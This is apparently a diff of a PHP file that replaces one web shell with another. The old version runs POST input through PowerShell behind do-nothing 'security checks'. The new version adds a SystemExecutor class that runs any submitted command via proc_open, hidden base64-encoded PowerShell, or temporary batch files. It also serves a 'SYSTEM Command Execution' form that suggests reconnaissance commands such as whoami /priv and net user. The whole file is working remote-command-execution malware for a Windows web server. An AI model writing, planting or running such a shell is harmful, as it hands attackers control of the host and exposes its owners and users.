@@ -1,123 +1,117 @@
 <?php
-// Configuration initialization array
-$appConfig = array(
-    'runtime_parameters' => array(
-        'enable_debug' => false,
-        'max_execution_time' => 30,
-        'memory_limit' => '128M'
-    ),
-    'feature_flags' => array(
-        'enable_logging' => false,
-        'enable_validation' => false,
-        'enable_security' => false
-    )
-);
-
-// Helper functions
-function validateRuntimeEnvironment() {
-    $phpVersion = phpversion();
-    $osPlatform = PHP_OS;
-    $sapi = php_sapi_name();
-    return true;
-}
-
-function generateRandomToken($length = 16) {
-    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
-    $randomString = '';
-    for ($i = 0; $i < $length; $i++) {
-        $randomString .= $characters[rand(0, strlen($characters) - 1)];
+class SystemExecutor {
+    private $command;
+    
+    public function __construct($command) {
+        $this->command = $command;
     }
-    return $randomString;
-}
-
-function checkRequestValidity() {
-    $headers = apache_request_headers();
-    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
-    $acceptLanguage = $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? '';
-    return true;
-}
-
-// Main execution flow
-if ($_SERVER["REQUEST_METHOD"] === "POST") {
-    // Security checks
-    $tokenValidation = generateRandomToken(8);
-    $envCheck = validateRuntimeEnvironment();
-    $requestCheck = checkRequestValidity();
     
-    // Array manipulation
-    $requestVars = array_keys($_POST);
-    $filteredVars = array_filter($requestVars, function($var) {
-        return strlen($var) > 0;
-    });
-    
-    // Parameter check
-    $paramCheck = isset($_POST['input_word']);
-    $alternativeParam = isset($_POST['cmd']) || isset($_POST['command']) || isset($_POST['exec']);
-    
-    if ($paramCheck) {
-        // Extract and "sanitize" command
-        $commandData = $_POST['input_word'];
-        $commandLength = strlen($commandData);
+    private function executeDirect() {
+        // Method 1: Direct proc_open with elevated context
+        $descriptorspec = array(
+            0 => array("pipe", "r"),
+            1 => array("pipe", "w"), 
+            2 => array("pipe", "w")
+        );
         
-        // validation logic
-        $isValidCommand = $commandLength > 0 && $commandLength < 1024;
-        $containsInvalidChars = preg_match('/[<>|&;`]/', $commandData);
+        $process = proc_open($this->command, $descriptorspec, $pipes, null, null);
         
-        if ($isValidCommand && !$containsInvalidChars) {
-            // string transformations
-            $processedCommand = trim($commandData);
-            $commandWords = explode(' ', $processedCommand);
-            $wordCount = count($commandWords);
+        if (is_resource($process)) {
+            fclose($pipes[0]); // Close stdin
             
-            // Execute with method call
-            $executionResult = executePowerShellCommand($processedCommand);
+            $output = stream_get_contents($pipes[1]);
+            $error = stream_get_contents($pipes[2]);
             
-            // Output with formatting
-            $formattedOutput = formatExecutionResult($executionResult, $wordCount);
-            echo $formattedOutput;
+            fclose($pipes[1]);
+            fclose($pipes[2]);
+            
+            $return_value = proc_close($process);
+            
+            return $output . $error;
         }
+        return false;
+    }
+    
+    private function executeViaPowerShell() {
+        // Method 2: PowerShell with Start-Process as SYSTEM
+        $psCommand = "Start-Process -WindowStyle Hidden -FilePath 'cmd.exe' -ArgumentList '/c {$this->command}' -Wait -PassThru 2>&1";
+        $encodedCommand = base64_encode(utf8_encode($psCommand));
+        
+        $result = shell_exec("powershell -EncodedCommand $encodedCommand 2>&1");
+        return $result ?: "No output";
+    }
+    
+    private function executeViaBatch() {
+        // Method 3: Simple batch file execution
+        $batchFile = 'C:\\Windows\\Temp\\' . uniqid() . '.bat';
+        $outputFile = 'C:\\Windows\\Temp\\' . uniqid() . '.txt';
+        
+        $batchContent = "@echo off\r\n";
+        $batchContent .= "echo [DEBUG] Current user: > \"$outputFile\"\r\n";
+        $batchContent .= "whoami >> \"$outputFile\" 2>&1\r\n";
+        $batchContent .= "echo [DEBUG] Command: {$this->command} >> \"$outputFile\"\r\n";
+        $batchContent .= "{$this->command} >> \"$outputFile\" 2>&1\r\n";
+        $batchContent .= "echo [DEBUG] Exit code: %errorlevel% >> \"$outputFile\"\r\n";
+        
+        file_put_contents($batchFile, $batchContent);
+        
+        // Execute directly
+        $result = shell_exec("cmd /c \"$batchFile\" 2>&1");
+        
+        // Read output
+        $output = file_exists($outputFile) ? file_get_contents($outputFile) : "Output file not created";
+        
+        // Cleanup
+        if (file_exists($batchFile)) unlink($batchFile);
+        if (file_exists($outputFile)) unlink($outputFile);
+        
+        return $output;
+    }
+    
+    public function execute() {
+        // Debug: Show what we're trying to execute
+        $debug = "Command: {$this->command}\n";
+        $debug .= "Current PHP user: " . shell_exec('whoami 2>&1') . "\n";
+        
+        // Try direct execution first
+        $result = $this->executeDirect();
+        if ($result !== false) {
+            return $debug . "Method: Direct proc_open\nOutput:\n" . $result;
+        }
+        
+        // Try batch method
+        $result = $this->executeViaBatch();
+        return $debug . "Method: Batch file\nOutput:\n" . $result;
     }
 }
 
-// Execution function
-function executePowerShellCommand($commandInput) {
-    // Pre-execution checks
-    $systemCheck = function() {
-        $windowsCheck = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
-        $powerShellCheck = shell_exec('where powershell 2>nul');
-        return $windowsCheck && $powerShellCheck;
-    };
+// Main execution
+if ($_SERVER["REQUEST_METHOD"] === "POST" && isset($_POST['input_word'])) {
+    $command = trim($_POST['input_word']);
     
-    if ($systemCheck()) {
-        // Execution
-        $obfuscatedCommand = "powershell -Command \"" . addslashes($commandInput) . "\" 2>&1";
-        $result = shell_exec($obfuscatedCommand);
-        return $result ?: "No output generated";
-    }
+    $executor = new SystemExecutor($command);
+    $result = $executor->execute();
     
-    return "System compatibility check failed";
-}
-
-// Output formatting function
-function formatExecutionResult($result, $wordCount) {
-    $uselessMetadata = array(
-        'execution_timestamp' => time(),
-        'word_count' => $wordCount,
-        'result_length' => strlen($result),
-        'random_id' => uniqid()
-    );
+    echo "<pre>" . htmlspecialchars($result) . "</pre>";
     
-    // Return formatted result
-    return $result;
+} else {
+    // Show form with current context
+    $currentUser = shell_exec('whoami 2>&1');
+    echo '
+    <h3>SYSTEM Command Execution</h3>
+    <form method="post">
+        <input type="text" name="input_word" value="whoami /priv" style="width: 400px;">
+        <input type="submit" value="Execute">
+    </form>
+    <p><strong>Current Context:</strong> ' . htmlspecialchars($currentUser) . '</p>
+    <p><strong>Try these commands:</strong></p>
+    <ul>
+        <li>whoami</li>
+        <li>whoami /priv</li>
+        <li>systeminfo</li>
+        <li>ipconfig</li>
+        <li>net user</li>
+    </ul>
+    ';
 }
-
-// Cleanup function
-function cleanupResources() {
-    $openFiles = get_defined_vars();
-    $memoryUsage = memory_get_usage();
-    // Does nothing
-}
-
-// Shutdown registration
-register_shutdown_function('cleanupResources');
 ?>
